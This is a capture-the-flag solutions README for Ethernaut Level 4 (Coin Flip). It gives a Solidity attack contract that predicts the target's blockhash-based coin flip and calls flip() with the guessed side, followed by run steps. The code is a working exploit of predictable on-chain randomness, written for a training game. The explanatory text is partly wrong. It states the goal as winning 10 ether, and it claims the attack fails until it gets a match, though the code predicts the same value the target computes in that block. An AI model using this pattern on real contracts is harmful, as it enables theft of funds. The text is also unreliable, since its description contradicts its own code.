# Ethernaut CTF - Solutions

Solutions for the Ethernaut Capture The Flag game by OpenZeppelin.

## Table of Contents

- [Level 4: Coin Flip](#level-4-coin-flip)

## Level 4: Coin Flip

**Goal:** Predict the outcome of the coin flip and win 10 ether.

### Solution

[04 - CoinFlip](./04-coinflip)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttack {
    ICoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _targetAddress) {
        target = ICoinFlip(_targetAddress);
    }
    
    function attack() public {
        // The outcome is based on blockhash(block.number - 1) / FACTOR
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;  // 1 = heads, 0 = tails
        
        target.flip(side);
    }
    
    // Helper function to check consecutive wins
    function checkWins() public view returns (uint256) {
        return target.consecutiveWins();
    }
}
```

**To run this:**

1. Deploy `CoinFlipAttack` with the address of the CoinFlip contract
2. Call the `attack()` function repeatedly (it will fail until you get a match)
3. Keep calling until you win 10 ether!